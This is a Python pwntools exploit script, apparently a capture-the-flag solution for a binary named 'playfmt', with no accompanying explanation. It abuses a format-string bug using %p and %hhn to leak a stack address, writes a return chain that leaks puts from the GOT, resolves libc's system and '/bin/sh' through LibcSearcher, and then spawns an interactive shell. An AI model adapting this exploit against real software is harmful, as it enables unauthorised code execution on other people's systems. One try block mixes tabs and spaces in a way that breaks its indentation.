from pwn import *
from LibcSearcher import LibcSearcher
# context.log_level = "debug"
ebp_offset = 6
ebp_1_offset = 10

def format_offset(format_str , offset):
	return format_str.replace("{}" , str(offset))

def get_target_offset_value(offset , name):
	payload = format_offset("%{}$p" , offset)
	p.sendline(payload)
	text = p.recv()
	try:
		value = int(text.split("\n")[0] , 16)
	  	print(name + " : " + hex(value))
		return value
	except Exception, e:
		print text

def modify_last_byte(last_byte , offset):
	payload = "%" + str(last_byte) + "c" + format_offset("%{}$hhn" , offset)
	p.sendline(payload)
	p.recv()

def modify(addr , value):
	addr_last_byte = addr & 0xff
	for i in range(4):
		now_value = (value >> i * 8) & 0xff
		modify_last_byte(addr_last_byte + i ,  ebp_offset)
		modify_last_byte(now_value , ebp_1_offset)

p = process("./playfmt")
elf = ELF("./playfmt")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
play = elf.symbols["play"]
print hex(play)
p.recvuntil("=\n")
p.recvuntil("=\n")
# leak ebp_1_addr then get ebp_addr
ebp_1_addr = get_target_offset_value(ebp_offset ,  "ebp_1") 
# get_ebp_addr
ebp_addr = ebp_1_addr - 0x10


modify(ebp_addr + 4 , puts_plt )
modify(ebp_addr + 8 , play)
modify(ebp_addr + 0xc , puts_got)
p.sendline("quit")
# get_target_offset_value(ebp_offset + 2 , "return")
puts_addr = u32(p.recv()[:4])
libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
system = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")
print("system : " + hex(system))
print("str_bin_sh : " + hex(str_bin_sh))
# leak ebp_1_addr then get ebp_addr
ebp_1_addr = get_target_offset_value(ebp_offset ,  "ebp_1") 
# get_ebp_addr
ebp_addr = ebp_1_addr - 0x10

modify(ebp_addr + 0x4 , system)
modify(ebp_addr + 0x8 , play)
modify(ebp_addr + 0xc , str_bin_sh)
p.sendline("quit")

p.interactive()